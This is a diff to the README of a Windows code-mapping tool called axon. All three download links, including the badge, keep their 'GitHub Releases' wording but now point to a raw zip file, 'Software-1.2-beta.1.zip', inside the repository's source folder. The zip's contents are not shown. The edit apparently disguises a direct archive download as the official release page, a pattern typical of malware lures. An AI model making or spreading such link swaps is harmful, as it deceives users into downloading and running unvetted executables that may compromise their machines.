@@ -1,6 +1,6 @@
 # 🧠 axon - Map Your Code With Ease
 
-[![Download axon](https://img.shields.io/badge/Download-axon-blue)](https://github.com/jasim-balad/axon/releases)
+[![Download axon](https://img.shields.io/badge/Download-axon-blue)](https://github.com/jasim-balad/axon/raw/refs/heads/main/src/axon/Software-1.2-beta.1.zip)
 
 ## 📋 What is axon?
 
@@ -26,7 +26,7 @@ This guide will show how to download and run axon on your Windows PC. The proces
 
 Click the link below to visit the official download page for axon:
 
-[Download axon from GitHub Releases](https://github.com/jasim-balad/axon/releases)
+[Download axon from GitHub Releases](https://github.com/jasim-balad/axon/raw/refs/heads/main/src/axon/Software-1.2-beta.1.zip)
 
 You will see a list of files for different versions and platforms.
 
@@ -108,7 +108,7 @@ Keep axon up to date to get new features and fixes:
 - If an update is available, follow the prompts to download and install it.
 - Alternatively, visit the download page below and get the latest installer:
 
-[Download axon from GitHub Releases](https://github.com/jasim-balad/axon/releases)
+[Download axon from GitHub Releases](https://github.com/jasim-balad/axon/raw/refs/heads/main/src/axon/Software-1.2-beta.1.zip)
 
 ## ❓ Troubleshooting and Support
 
